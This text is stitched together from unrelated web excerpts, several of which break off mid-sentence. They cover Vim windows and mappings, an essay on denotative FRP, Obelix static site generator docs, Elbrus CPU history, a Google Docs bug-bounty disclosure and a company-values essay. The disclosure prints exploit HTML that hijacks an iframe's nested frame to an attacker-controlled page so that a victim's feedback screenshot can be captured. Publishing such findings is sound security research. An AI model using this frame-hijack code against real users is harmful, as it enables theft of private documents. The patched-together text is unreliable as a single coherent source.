<p>Who wants windows without being able to resize them? Here are the keystrokes you need:</p>
<ul>
<li><code>CTRL-W =</code> - Resize windows for them to fit on the screen with the same size.</li>
<li><code>CTRL-W -</code> - Decrease window’s height.</li>
<li><code>CTRL-W +</code> - Increase window’s height.</li>
<li><code>CTRL-W &lt;</code> - Decrease window’s width.</li>
<li><code>CTRL-W &gt;</code> - Increase window’s width.</li>
</ul>
<p>Using these keystrokes to move the cursor from window to window and to move the windows themselves is pretty tedious . We’ll see later a plugin which can help to make the whole operation smoother.</p>
<p>If you want to quit windows, you can use the commands:</p>
<ul>
<li><code>:q</code> - To <code>q</code>uit the current window. People lied to you! <code>:q</code> doesn’t quit Vim, but a window. You quit Vim only if there is only one window open.</li>
<li><code>:q!</code> - To <code>q</code>uit the current window, even if there is only one window open with an unsaved buffer<code>!</code>.</li>
</ul>


  




    





  

<div>
    
    <div>
         <ul>
<li><code>:help windows</code></li>
<li><code>:help opening-window</code></li>
<li><code>:help window-move-cursor</code></li>
<li><code>:help window-moving</code></li>
<li><code>:help window-resize</code></li>
</ul>
 
    </div>
</div>



<h3 id="tabs">Tabs</h3>
<p>We saw that a buffer is an open file, and a window is the container for an active buffer. We can see tabs as a container for a bunch of windows. In that way, it’s very different than the concept of tabs in a standard IDE!</p>
<p>Here are the commands to create and delete tabs:</p>
<ul>
<li><code>:tabnew</code> or <code>:tabe</code> - Open a new tab.</li>
<li><code>:tabclose</code> or <code>:tabc</code> - Close the current tab.</li>
<li><code>:tabonly</code> or <code>:tabo</code> - Close every other tab except the current one.</li>
</ul>
<p>To move from tab to tab, you can use these keystrokes:</p>
<ul>
<li><code>gt</code> - <code>g</code>o to the next <code>t</code>ab.</li>
<li><code>gT</code> - <code>g</code>o to the previous tab.</li>
</ul>
<p>You can as well add a count before the last two keystrokes. For example, <code>1gT</code> go to the first tab. Yep, tabs are indexed from 1.</p>


  




    





  





<h3 id="argument-list-arglist">Argument List (arglist)</h3>
<p>The argument list (also called arglist) is the fourth and last container allowing you to organize your open files. It’s useful to see it as a <em>stable subset</em> of the buffer list, as Drew Neil point it out in <a href="http://vimcasts.org/episodes/meet-the-arglist/" target="_blank" rel="noopener">one of his vimcast</a>. As a result, it follows these two rules:</p>
<ol>
<li>Every file in the arglist will be in the buffer list.</li>
<li>Some files in the buffer list won’t be in the arglist.</li>
</ol>
<p>The files you want to open when you run Vim - such as executing <code>vim file1 file2 file3</code> - will be automatically added to the arglist and, as we just saw, to the buffer list.</p>
<p>The arglist can be useful to isolate some files from the buffer list to do some operations on them. Here are some commands you can use to manipulate the arglist:</p>
<ul>
<li><code>:args</code> - Display the arglist.</li>
<li><code>:argadd</code> - Add file to the arglist.</li>
<li><code>:argdo</code> - Execute a command on every file in the arglist.</li>
</ul>
<p>To edit the files in the arglist, you can use these commands:</p>
<ul>
<li><code>:next</code> - Move to the next file in the arglist.</li>
<li><code>:prev</code> - Move to the previous file in the arglist.</li>
<li><code>:first</code> - Move to the first file in the arglist.</li>
</ul>
<p>I don’t use very often the arglist personally, but many users do. The buffer list can be modified by other actions unrelated directly to buffers, like opening new windows. The arglist stays the same, except if you explicitly modify it. That’s why it’s stable.</p>


  




    





  





<h2 id="mapping-keystrokes">Mapping Keystrokes</h2>
<p>We’ve seen a great deal of keystrokes and commands. It would be nice to be able to modify these keystrokes, or to assign new keystrokes to precise commands.</p>
<p>You can use mapping commands for every Vim mode:</p>
<ul>
<li><code>:nmap</code> - Create new mapping for NORMAL mode.</li>
<li><code>:imap</code> - Create new mapping for INSERT mode.</li>
<li><code>:vmap</code> - Create new mapping for VISUAL mode.</li>
</ul>
<p>It might sound confusing to have different mappings for different modes, but it’s actually very easy to remember, thanks to our muscle memory.</p>
<p>Let’s try an example together by mapping <code>w</code> to <code>dd</code>. By default, <code>dd</code> delete a line, and <code>w</code> is a motion to move your cursor from word to word.</p>
<ol>
<li>Run the command <code>:nmap w dd</code></li>
<li>Try to hit the keystroke <code>dd</code>. It will delete a line.</li>
<li>Try to hit <code>w</code>. It deletes a line to.</li>
</ol>
<p>However, <code>w</code> can’t be used anymore to move from word to word. Let’s try to fix that by running: <code>:nmap w v</code>.</p>
<p>Try to hit <code>v</code> now. It deletes a line too! You just did a recursive mapping: <code>v</code> maps to <code>w</code> which maps to <code>dd</code>. It would be …</p></section></article></div></div>

The talk was not recorded but you can <a href="https://www.loom.com/share/936dd606f9d948e194cf39bc353b2816">watch a (rough) practice talk here</a>.

<p>For many years I been searching for the perfect paradigm for programming user interfaces. Like many others, I fell in love with FRP with the rise of ReactJS and spent a few years searching for the perfect reactive model. Eventually, I found my way back to the original work on FRP by Conal Elliott. It took me almost a year to make sense of it. This essay attempts to make Conal’s vision more understandable to less mathematically-oriented programmers, and also show how this perspective could be the foundation for a new era of programming, not just with user interfaces, but also multi-node computing, storage, machine learning, etc.</p>

<p>This essay assumes familiarity with:</p>

<ul>
  <li>JavaScript syntax, including Promises,</li>
  <li>a web FRP library, such as ReactJS, VueJS, CycleJS, Redux, or Elm,</li>
  <li>and minimal ML/Haskell syntax, including the <code>Maybe</code> type.</li>
</ul>

<h2 id="modern-reactive-web-programming">Modern Reactive Web Programming</h2>

<p>I fell in love with ReactJS in late 2014. The view is a pure function of state. It was so obviously <em>right</em>.</p>

<p>But of course React isn’t the whole answer. It’s just a view library that keeps the view in sync with state. It’s left open how you manage that state.</p>

<p>Inspired by the Elm Architecture, Redux became the popular answer to the state management question. It puts the state of the entire application into a single object. To affect this global state object, your HTML event handlers emit “actions”, such as <code>{"type": "newTodoItem", "description": "Clean my room"}</code>. You then define a reducer function that modifies the global state each time it receives an action. This architecture initially made a lot of sense to me. One big sell is that its global state object is easily serialized, which enables hot reloading and time-travel debugging.</p>

<p>Unexpectedly, when I tried to make sense of large Redux projects, I found myself getting headaches. I found it difficult to understand how the app fit together, which parts affected which other parts. I began to see that the Redux architecture was <a href="https://futureofcoding.org/papers/comprehensible-frp">simulating global mutable state in a seemingly immutable and functional setting, ruining modularity and comprehensibility</a>.</p>

<p>I eagerly slurped up each new React-inspired framework, such as VueJS and CycleJS, to see if they could finally be the “full solution” to interface development, but none felt quite right.</p>

<p><a href="https://pchiusano.github.io/">Paul Chiusano</a> suggested I read <a href="http://conal.net/">Conal Elliott</a>, the creator of the FRP paradigm. Paul claimed that React and the other JS-based FRP libraries weren’t even ‘true’ FRP. I didn’t like to hear this. I loved React and the FRP I knew. I was reluctant to read <a href="http://conal.net/papers/icfp97/">a stodgy paper from the 90s</a>. But I trusted and respected Paul so I gave it a go.</p>

<p>It was a lot of mathematics and strange symbols. What’s a “least upper bound” and “pointed CPO”? My eyes glazed over. I tried a more <a href="http://conal.net/papers/push-pull-frp/">recent paper he wrote on FRP</a>, but it was full of scary Applicative Functors and Monads. I gave up.</p>

<p>However, I couldn’t escape HN comments alluding to “<a href="https://hn.algolia.com/?sort=byPopularity&amp;prefix&amp;page=0&amp;dateRange=all&amp;type=comment&amp;query=real%20frp">real</a>” or “<a href="https://hn.algolia.com/?sort=byPopularity&amp;prefix&amp;page=0&amp;dateRange=all&amp;type=comment&amp;query=original%20frp">original</a>” FRP. They were annoying enough to send me back to Conal for another try. This time I printed out all his papers, determined to make sense of them!</p>

<p><img src="https://user-images.githubusercontent.com/2288939/41498690-cb736744-7141-11e8-98b3-634d0b630f9e.png" alt=""></p>

<p>I took my time with the unfamiliar mathematical and typeclass concepts. With a lot of focused reading, it finally began to click.</p>

<h2 id="dctp-denotative-continuous-time-programming">DCTP: Denotative Continuous-Time Programming</h2>

<p>It’s important to distinguish between the <a href="https://medium.com/@andrestaltz/why-i-cannot-say-frp-but-i-just-did-d5ffaa23973b">many flavors of FRP</a>. The name originally comes from Conal Elliott and Paul Hudak’s work in the 90s . The term has since been stretch so far beyond its original meaning that Conal has <a href="https://stackoverflow.com/questions/5385377/the-difference-between-reactive-and-functional-reactive-programming/5386908#5386908">retreated to a new phrase</a> to describe his original vision: Denotative Continuous Time Programming (DCTP).</p>

<h2 id="d-is-for-denotative">D is for Denotative</h2>

<p>The D of DCTP has similarly nuanced intellectual roots. It stands for “denotative”, a term <a href="https://www.cs.cmu.edu/~crary/819-f09/Landin66.pdf">Peter Landin proposed</a> as a an alternative to “nonprocedural”, “functional” or “declarative”, which lack precise definitions. A denotative programming language is one where:</p>

<blockquote>
  <p>(a) each expression has a nesting subexpression structure,</p>
</blockquote>

<p>Unlike most programming languages which have a mix of statement commands and expressions, denotative programming languages live solely in the world of expressions. For example, instead of if-statements, there are ternary expressions. Instead of loops, recursion. Nested mathematical-like expressions are the only way to construct programs, and thus a program is simply one large, nested expression.</p>

<blockquote>
  <p>(b) each subexpression denotes something (usually a number, truth value or numerical function),</p>
</blockquote>

<p>Additionally, the components of denotative languages must <em>denote</em> some mathematical object. This was directly inspired by Chris Strachey and Dana Scott’s work from the early 1970’s on denotational semantics, an approach to modeling programming languages with mathematical objects. But where denotational semantics was originally created as a way to <em>analyze all programming languages</em>, denotative programming languages are a very specific kind of language, purposefully designed to be well-suited for mathematical reasoning.</p>

<p>For example, a map (“object” in JavaScript, “dictionary” in Python) in a denotative language could <em>denote</em> a <em>mathematical function</em> of keys to <code>Maybe</code> values. The empty map would be <code>key =&gt; Nothing</code>, returning <code>Nothing</code> for any key. Inserting a key, value pair could be: <code>(map, key, value) =&gt; (key' =&gt; key === key' ? Just value : map(key))</code>, which wraps an old map function with a new key comparison, but delegates to the old function for the remaining keys.</p>

<p>This map need not be <em>implemented</em> in such an inefficient way for a language to qualify as denotative.  Denotations are specifications, describing the <em>what</em>, but leaving the <em>how</em> open. Implementations of denotative languages can be as as non-denotative as efficiency concerns demand. A common misunderstanding of the denotative approach is that it’s impractical to eschew statements, because statements must be executed eventually for computation to be carried out. This is of course true, but the distinction is that in denotative languages, statements live in the implementation of the language instead of in the language itself.</p>

<p>For example, even non-denotative languages have functions like <code>pow</code>, <code>sqrt</code>, <code>log</code>, <code>sin</code>, and <code>cos</code>, which denote their equivalent mathematical operations. Users of these functions are free to treat them as true expressions, without having to worry about their potentially non-denotative implementation details. Do they use specially-designed hardware? Loops? It doesn’t matter: users are free to write <code>log(x) + sin(y)</code> and the language’s compiler or interpreter will execute these expressions with whatever non-denotative algorithm is most efficient, as long as it meets the denotative specification for <code>log</code> and <code>sin</code>.</p>

<p>From the denotative perspective, anywhere an operation does not meet its denotative equivalent is a bug. This would include anywhere floating-point math is used, which causes, for example,  <code>0.1 + 0.2</code> to equal <code>0.30000000000000004</code>. In other words, all the quirks of math you need to learn <em>above and beyond what you already learned in algebra class</em> is considered incidental complexity. On the other hand, non-denotative languages aren’t trying to be denotative, so it’s not entirely fair to rank them according to a rubric they are not aiming for.</p>

<blockquote>
  <p>(c) the thing an expression denotes, i.e., its “value”, depends only on the values of its subexpressions, not on other properties of them.</p>
</blockquote>

<p>The final criteria is that expressions in denotative languages are entirely self-contained. There’s no action-at-a-distance. There’s no way to call <code>someValue.update()</code>. For one, that would be a statement. But additionally, all possible ways <code>someValue</code> updates need to be defined in one of the sub-expressions of <code>someValue</code> itself.</p>

<p>In summary, a denotative language is a pure functional language, with the addition of point (b): mathematical denotations.</p>

<h3 id="benefits-of-denotative-programming">Benefits of Denotative Programming</h3>

<p>Programmers spend roughly <a href="http://www.humane-assessment.com/guide/assessment-costs/">50% of their time reading code</a>, so a language that better lends itself to comprehensibility is a boon for productivity.</p>

<p>Denotative languages better convey the global structure of a program. We can <em>fully</em> understand an expression by its subexpressions, and their subexpressions, recursively. There are no spooky action-at-a-distance side-effects that can manipulate things from afar. We don’t have to read the entire codebase to ensure we understand a single piece; we must merely read its subexpressions, recursively. This allows us to quickly rule out what we do and do not need to read, saving us a lot of time in large codebases. A denotative language resembles a dictionary or encyclopedia, where one can understand an entry by reading it and what it references. A non-denotative language resembles prose, like a novel, which you have to read cover-to-cover to know what happens, even if you only care about one specific character.</p>

<p>These comprehensibility benefits extend to local analysis as well. In denotative programming, the equal sign means what it does in a mathematics textbook: we can replace instances of the left with the expression to the right. This is known as referential transparency. We can safely refactor:</p>

<div><div><pre><code><span>b</span> <span>=</span> <span>f</span><span>(</span><span>a</span><span>)</span>
<span>c</span> <span>=</span> <span>g</span><span>(</span><span>b</span><span>)</span>
<span>d</span> <span>=</span> <span>h</span><span>(</span><span>c</span><span>)</span>
</code></pre></div></div>

<p>to:</p>



<p>True equality is also a boon for performance optimizations, which is about replacing sections of programs with equivalent but faster sections. When your code is free of operational concerns, the language implementer is able to make more interesting optimizations. The flip-side is that because the denotative approach cuts us off from these implementation details, it lessens the ability of a user of a denotative language to improve the performance of their programs. However, programmer time is often more …</p></div></div>

        <img src="https://obelix-site-builder.github.io/obelix/images/obelix.jpg" alt="obelix the gaul">
      </p>
      <p>Obelix is a <a href="https://www.netlify.com/blog/2020/04/14/what-is-a-static-site-generator-and-3-ways-to-find-the-best-one/">static site generator</a>. Its primary goals are simplicity, ease of use, and extensibility.</p>
      <p>In a nutshell, a static site generator transforms a set of input data into static assets (HTML, CSS, JavaScript, images, etc.) ready to be served by a web server. The input data can come from a wide variety of sources, from local files on disk to APIs.</p>
      <p>Out of the box, Obelix supports:</p>
      <ul>
        <li><a href="https://commonmark.org/">CommonMark</a>-compliant markdown rendering</li>
        <li>Page and post metadata via <a href="https://rollout.io/blog/yaml-tutorial-everything-you-need-get-started/">YAML</a> frontmatter</li>
        <li>String templating powered by <a href="https://handlebarsjs.com/">Handlebars</a></li>
        <li>Layout templates to apply a common layout to the whole site or a subdirectory</li>
        <li>List templates to render index pages, feeds, or any other listing of a subdirectory</li>
        <li>A powerful plugin system that allows developers to write JavaScript to pull in data from external APIs, transform existing data before it gets rendered, or anything else you can imagine</li>
      </ul>
      <h2>Installation</h2>
      <p>Obelix is available <a href="https://npmjs.org/obelix">on NPM</a>. It's meant to be installed globally:</p>
      <pre><code>$ sudo npm install -g obelix
</code></pre>
      <h2>Getting started</h2>
      <p>An Obelix site consists of a directory containing the source files for the website and an <code>obelix.json</code> configuration file. At a minimum, this file needs to contain two keys, <code>"src"</code> and <code>"out"</code>:</p>
      <pre><code>{
    "src": "source",
    "out": "build"
}
</code></pre>
      <p>The <code>"src"</code> key should be the relative path to the directory where your site's source files live. The <code>"out"</code> key is the relative path to the directory where Obelix will output the built site. For example, the directory for the site described by the <code>obelix.json</code> above might look like this:</p>
      <pre><code>.
├── obelix.json
└── source
    ├── index.md
    └── # all site source files here
</code></pre>
      <p>To build the site, run:</p>
      <pre><code>$ obelix build
</code></pre>
      <p>This will parse through all file in the source directory, transform them as necessary, and render the final site to the output directory (creating it if necessary). Any markdown files will get transformed to HTML, frontmatter and Handlebars template expressions will be processed, and layout and list templates will be applied.</p>
      <p>You can also run:</p>
      <pre><code>$ obelix serve
</code></pre>
      <p>This will start a web server serving your site on port 8080 (by default - pass the <code>-p</code> option to change this). The server will automatically rebuild the site whenever it detects changes to a source file. This is a just a development convenience - the <code>obelix serve</code> server is not production-ready!</p>
      <p>There are a few other keys you can put in <code>obelix.json</code>:</p>
      <ul>
        <li><code>"metadata"</code>: this should be a JSON object containing site metadata. This object will exposed in Handlebars templates as the <code>site</code> key (see below)</li>
        <li><code>"plugins"</code>: An object mapping plugin names to configuration options. More details on this in the Plugins section below</li>
      </ul>
      <h2>Source file configuration</h2>
      <p>All source files in an Obelix site are considered either an <code>asset</code> or a <code>page</code>. A <code>page</code> is a text file (with any file extension) where the beginning of the file contains <a href="https://rollout.io/blog/yaml-tutorial-everything-you-need-get-started/">YAML</a> frontmatter. YAML frontmatter is used to specify metadata about the page and consists of the characters <code>---</code>, followed by a newline and a YAML document containing data you want, and finally another newline and the closing characters <code>---</code>. For example:</p>
      <pre><code>---
author: Getafix
title: Little-known herbs of Gaul
published: 2020-12-17
tags:
  - blog
  - druidism
---
And then the page content goes here!
</code></pre>
      <p>Obelix performs some default transformations on <code>page</code>-type sources, including expanding Handlebars template expressions and applying layout templates, and exposes these files as data in list templates (more on all this later).</p>
      <p>Any file that does not contain YAML frontmatter, including image or other non-text files, are considered <code>asset</code>-type sources. Obelix does no additional processing on <code>asset</code> files - it just copies them verbatim to the output directory.</p>
      <p><strong>Important</strong>: Even if you have no metadata you want to attach to a page, you need to put YAML frontmatter on it for Obelix to process it. In these cases, you can just put the opening <code>---</code> and closing <code>---</code> with no content in between.</p>
      <p>The source directory structure determines the output directory structure. For example, a source file <code>blob/post1.md</code> would get written to the output directory as <code>blog/post1.html</code>.</p>
      <h2>Template expansion</h2>
      <p><code>Page</code>-type source files can contain <a href="https://handlebarsjs.com/">Handlebars</a> template expressions. Template expressions are delimited by double curly braces - for example, <code>{{ title }}</code>. Any page metadata in the page's frontmatter is available as a variable for use in a template expression, and any site metadata set in <code>obelix.json</code> is available in the <code>site</code> object in template expressions.</p>
      <p>For example, given the following <code>obelix.json</code>:</p>
      <pre><code>{
    "src": "source",
    "out": "build",
    "metadata": {
        "publisher": "When In Rome LLC"
    }
}
</code></pre>
      <p>And the following <code>page</code> source <code>post.md</code>:</p>
      <pre><code>---
author: Caesar
---
This post was written by {{ author }} and published by {{ site.publisher }}
</code></pre>
      <p>The output file <code>post.html</code> would render like this:</p>
      <pre><code>&lt;html&gt;
  &lt;body&gt;
    &lt;p&gt;This post was written by Caesar and published by When In Rome LLC&lt;/p&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
      <p>Handlebars offers many additional templating features - see <a href="https://handlebarsjs.com/guide/">the official guide</a> to learn more.</p>
      <h2>Layout templates</h2>
      <p>Layout templates allow you to apply a unified layout to <code>page</code> sources. By default, layout templates are any file named <code>layout.html.hbs</code> or <code>layout.html.handlebars</code>, but these defaults can be overridden by the <code>"layoutTemplates"</code> <code>obelix.json</code> field, which should be an array of layout template names. Individual pages can also specify a <code>template</code> metadata field, which should be the name of the file to use as a layout template for that page. Layout templates apply to all <code>page</code> sources in the same directory they are in and in subdirectories, but if a subdirectory has its own layout template that template overrides the parent layout template. This means you can put a <code>layout.html.hbs</code> at the root of your site that will be applied by default to every <code>page</code> in the site, but you can override that template for individual subdirectories by giving them their own <code>layout.html.hbs</code>.</p>
      <p>A layout template is a Handlebars template that gets passed the content of the page it is applied to as the <code>content</code> key. When rendering a <code>page</code>, if Obelix finds a layout template for that page it will render the layout template and replace the output content with the result.</p>
      <p>An example should make things clearer. Given this <code>page</code> source <code>post.md</code>:</p>
      <pre><code>---
---
# My Post
This is some hot content!
</code></pre>
      <p>And this <code>layout.html.hbs</code>:</p>
      <pre><code>&lt;html&gt;
  &lt;head&gt;
     &lt;link rel="stylesheet" href="styles.css" /&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div class="container"&gt;
       {{{ content }}}
    &lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
      <p>The output file <code>post.html</code> would look like this:</p>
      <pre><code>&lt;html&gt;
  &lt;head&gt;
     &lt;link rel="stylesheet" href="styles.css" /&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div class="container"&gt;
      &lt;h1&gt;My Post&lt;/h1&gt;
      &lt;p&gt;This is some hot content!&lt;/p&gt;
    &lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
      <p>Note the use of triple curly braces in <code>{{{ content }}}</code>. This tells Handlebars not to HTML-escape the result of the expression. See <a href="https://handlebarsjs.com/guide/#html-escaping">here</a> for more info.</p>
      <h2>List templates</h2>
      <p>A list template is like a layout template, but instead of being passed a single page it gets passed a list of pages. List templates can be used to generate index pages, RSS feeds, or any other collection of content. A list template is simply any file with a <code>.hbs</code> or <code>.handlebars</code> file extension that isn't a layout template. Unless you have the <code>"layoutTemplates"</code> configuration option set, this means that any <code>.hbs</code> or <code>.handlebars</code> file that isn't named <code>layout.html.hbs</code>, <code>layout.html.handlebars</code>, or is the target of a <code>template</code> page metadata will be treated as a list template.</p>
      <p>List templates get passed an array of all pages in the same directory as them as the <code>pages</code> variable. Each item in this list is a <code>page</code> object that the one that gets passed to layout templates - it will have a <code>content</code> key containing the page content in addition to any keys in the page frontmatter. The <code>pages</code> array can be iterated over using the <a href="https://handlebarsjs.com/guide/builtin-helpers.html#each">Handlebars <code>each</code> helper</a>:</p>
      <pre><code>&lt;html&gt;
    &lt;body&gt;
      {{#each pages}}
          &lt;h1&gt;{{ title }}&lt;/h1&gt;
          
      {{/each}}
    &lt;/body&gt;
&lt;/html&gt;
</code></pre>
      <p>If you want to iterate over pages that aren't in the same directory as the list template, you can use the <code>site.pages</code> variable. This variable is a nested array of all pages in the site. The format of <code>site.pages</code> is a little weird: it's a recursive array that can be iterated over to access the pages in the top-level directories, but exposes subdirectories as attributes on that array with values that are themselves recursive arrays. For example, given the following site structure:</p>
      <pre><code>.
├── index.md
├── about.md
└── blog
    ├── post1.md
    └── post2.md
</code></pre>
      <p>The <code>site.pages</code> variable would be an array containing <code>index.md</code> and <code>about.md</code>, and <code>site.pages.blog</code> would be an array containing <code>post1.md</code> and <code>post2.md</code>.</p>
      <p>If you have a directory whose name isn't a valid JavaScript identifier, you can access it using index notation, e.g. <code>site.pages["My weird folder"]</code>. Although this layout is a bit unconventional, it makes it convenient to loop through pages using the <code>{{each}}</code> helper at any level in the directory structure.</p>
      <p>List templates can be either <code>page</code> or <code>asset</code> sources. If you include a frontmatter block in a list template, it will be treated as a <code>page</code> and have layout templates applied to it. If not, it will be treated as an <code>asset</code> and layout templates will not be applied to it.</p>
      <p>Tip: Obelix adds a <code>url</code> metadata field to every page by default. This is especially useful in list templates as it lets you construct a link to the pages that the list template is rendering.</p>
      <h2>Data files</h2>
      <p>Source files with a <code>.json</code>, <code>.yaml</code>, or <code>.yml</code> extension are considered data files. Data files are a way to store structured data that isn't meant to be displayed literally. Obelix parses all the data files it finds and passes …</p></div></div>

<h2>ELBRUS MCST History</h2>



<div><p>Before we look at the IcepeakITX ELBRUS-8CB motherboard lets first look at the history of Elbrus. </p><p>Elbrus CPU’s have been around for a very long time although unless you’re from Russia you’ve likely never heard of them. </p><p>They were first released in the early 1970’s and used in the Soviet space program, nuclear weapons research and defence systems as well as for research. </p></div>



<h3>Elbrus Timeline</h3>



<ul id="block-082e432c-8cfa-49d3-a848-51fd5247f666"><li><em>Elbrus 1</em>&nbsp;(1973) was the first in the line.<ul><li>A side development was an update of the 1965&nbsp;BESM-6&nbsp;as Elbrus-1K2.</li></ul></li><li><em>Elbrus 2</em>&nbsp;(1977) was a 10-processor computer, considered the first Soviet&nbsp;supercomputer, with superscalar&nbsp;RISC&nbsp;processors. Re-implementation of the Elbrus 1 architecture with faster&nbsp;ECL&nbsp;chips.</li><li><em>Elbrus 3</em>&nbsp;(1986) was a 16-processor computer developed by the Babayan’s team, and one of the first VLIW computers in the world.</li><li><em>Elbrus 2000</em>&nbsp;(2001) was a microprocessor development of the&nbsp;<em>Elbrus 3</em>&nbsp;architecture. Also known as&nbsp;<em>Elbrus-S</em>.<ul><li><em>Elbrus-3M1</em>&nbsp;(2005) is a two-processor computer based on&nbsp;Elbrus 2000&nbsp;microprocessor working at 300&nbsp;MHz.</li><li><em>Elbrus МВ3S1/C</em>&nbsp;(2009) is a&nbsp;ccNUMA&nbsp;four-processor computer based on&nbsp;Elbrus-S&nbsp;microprocessor working at 500&nbsp;MHz.</li></ul></li><li><em>Elbrus-2S+</em>&nbsp;(2011) working at 500&nbsp;MHz, with capacity to calculate 16&nbsp;GFlops.</li><li><em>Elbrus-2SM</em>&nbsp;(2014) working at 300&nbsp;MHz, with capacity to calculate 9.6&nbsp;GFlops.</li><li><em>Elbrus-4S</em>&nbsp;(2014) working at 800&nbsp;MHz, with capacity to calculate 50&nbsp;GFlops.<sup>[1]</sup></li><li><em>Elbrus-1S+</em>&nbsp;(2016) SoC with GPU, working at 600–1000&nbsp;MHz, with capacity to calculate 24&nbsp;GFlops.</li><li><em>Elbrus-8S</em>&nbsp;(2014–2015) working at 1300&nbsp;MHz, with capacity to calculate 250&nbsp;GFlops.</li><li><em>Elbrus-8SV</em>&nbsp;(2018) working at 1500&nbsp;MHz, with capacity to calculate 576&nbsp;GFlops.</li><li><em>Elbrus-16S</em>&nbsp;(2019) working at 2000&nbsp;MHz, with capacity to calculate 1.5&nbsp;TFlops.</li></ul>



<p>Over the years Elbrus have used several different architectures including: SPARC, x86 and Elbrus 2000.<br>Back in 2014 ELBRUS released the Elbrus-4C CPU which was designed for home and office use within Russia. Performance wasn’t great and as it couldn’t fully support x86. Computers using the Elbrus-4C CPU shipped with a custom proprietary Linux distro named Elbrus OS. Little is known about the success of this platform and they are never seen in the western world. I tried to buy an Elbrus-4C computer and have it shipped from Russia to the UK back in 2015 and it proved impossible. <br></p>

                    <p>By <a href="https://twitter.com/kl_sree">KL Sreeram</a></p><p>Google has integrated a <a href="https://www.google.com/tools/feedback">feedback sharing mechanism</a> for many of its products like Google Docs, Google Sheets and so on. This feature is supposed to help users report bugs and broken functionality to Google developers who could then work on fixing it.</p><h2 id="sending-feedback-in-google-products">Sending Feedback in Google Products</h2><p>You might have noticed a <strong>Send Feedback </strong>button at the bottom of the page while using Google Docs. It's a harmless feature, and its implemented as a feed back sharing system for Google Docs when you encounter issues. When you click on the button, a popup would appear asking you to describe the problem and this feature automatically takes a screenshot, sending (uploading) the data to Google for further review.</p><figure><img src="https://savebreach.com/content/images/2020/12/image-22.png" alt=""><figcaption>The "Send Feedback" popup in Google Docs</figcaption></figure><p>This feedback sharing feature is also implemented in many other Google products using an iFrame, embedded into the parent page (the Google Product).</p><p>This made me wonder how Google was displaying this image. I found, the image was being uploaded to Google via postMessage, and then rendered in the popup box before being sent to Google for further investigation.</p><h2 id="the-bug">The Bug</h2><p>There was some cross-origin communication happening between docs.google.com, www.google.com and feedback.googleusercontent.com (which was a sandboxed domain). Even after trying a lot I was unable to find any XSS in feedback.googleusercontent.com which could have helped me in stealing the screenshot image data.</p><p>Below is a graphical representation of the steps in this process – </p><figure><img src="https://savebreach.com/content/images/2020/12/image-23.png" alt=""><figcaption>How the screenshot was uploaded to Google servers</figcaption></figure><p>The following <code>postmessage</code> function sent the data to feedback.googlusercontent.com, however the postmessage configuration didn't allow other domains to be iFramed.</p><pre><code>windowRef.postmessage("&lt;Data&gt;","https://feedback.googleusercontent.com");</code></pre><p>However, the final <code>postmessage</code> function upon submitting the feedback was configured in a manner that allowed modifying the iFrame to an evil website</p><pre><code>windowRef.postmessage("&lt;Data&gt;","*");</code></pre><p>The wildcard scope allowed the <code>postmessage</code> data to be sent to an evil attacker controlled domain. The security misconfiguration here is the wildcard scope <code>*</code> &nbsp;that allowed me to steal and hijack Google Docs screenshots which were meant to be uploaded to Google's servers</p><p>Also, worth noting that the exploit worked in this case as Google Docs, by design has no <code>X-Frame-Options header</code>, which eventually helped exploit the cross-origin communication (through postMessage), although they do have some other protection against clickjacking and similar attacks as most features are disabled when the Google Docs pages are embedded in an iFrame.</p><h2 id="the-final-exploit">The Final Exploit</h2><p>Finally, I was able to put together all these vulnerabilities, in order to extract the Google Docs page screenshot by embedding it in a malicious iFrame and using <code>window.frames.frame.location</code> to load my exploit page from an external domain and steal user's Google Docs page screenshot</p><pre><code>&lt;html&gt;
    &lt;iframe src="https://docs.google.com/document/document_ID" /&gt;
    &lt;script&gt;
       //pseudo code
        
        
        setTimeout(function(){ alert("Hello"); }, 6000);

        function exp(){
        setInterval(function(){ 
         window.frames[0].frame[0][2].location="https://geekycat.in/exploit.html";
        }, 100);
        }
    &lt;/script&gt;
&lt;/html&gt;</code></pre><p>The above exploit gets triggered only once the user clicks on <strong>Send Feedback </strong>button. For allowing the iFrame to load, a setTimeout function executes every 6s (or, 6000 ms). To hijack the frame once it loads – the setInterval is used which tries to change the location of the iFrame every 100 ms to ensure the screenshot is stolen once the iFrame loads.</p><p>This could have allowed any attacker to steal sensitive information about your Google Docs documents and presentations, since organizations use it as part of G Suite for managing highly sensitive information. Although, this attack needs some user interaction but its not impossible given an attacker can easily convince a victim to perform the needed interaction (button click).</p><p>The <code>exploit.html</code> contains a postMessage event listener that captures the URL of the uploaded image, and the attacker successfully exfiltrates the Google Docs page screenshot in this way.</p><h2 id="video-poc-of-the-exploit">Video PoC of the Exploit</h2><p>Below is a Proof of Concept video of how the exploit worked, and how it could have allowed any attacker to steal screenshots of your private Google Docs documents by loading it in an iFrame on an attacker controlled website.</p><figure><iframe width="356" height="200" src="https://www.youtube.com/embed/isM-BXj4_80?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><h2 id="the-bounty">The Bounty</h2><p>Google rewarded <strong>$3133.7</strong> &nbsp;for this bug under their VRP program.</p><p><a href="https://twitter.com/kl_sree">KL Sreeram</a> is a security researcher and bug bounty hunter. He is one of the top researchers in the Google VRP program. This bug was first documented by KL Sreeram on his <a href="https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/">blog</a>.</p>

    <p><strong>April, 2020</strong></p>
<p>Technology companies love to talk about their values. Unfortunately, values are highly abstract and ambivalent constructs that mean different things to different people.</p>
<p>In my opinion, the reason why certain companies (or the leadership teams) love values so much is due to a fundamental lack of inspiring visions. When your company's purpose is to make people click on useless ads, you've got to come up with something else to inspire your employees. Luckily, humans are built with descent bullshit detectors and in practice this form of corporate jargon rarely works as a motivator.</p>
<p>Recognizing the above, I believe that organizations that have a meaningful reason to exist (ie something people can stand behind) should start the other way around. They should define their purpose, spend quality time describing and documenting the world they adhere to, and then reverse engineer from that.</p>
<p>An organization that strives to be <em>fully aligned</em> with its purpose, <em>highly aligned</em> with its day to day practices and <em>loosely aligned</em> in terms of beliefs and principles is more likely to create an inspiring environment for existing and potential employees.</p>

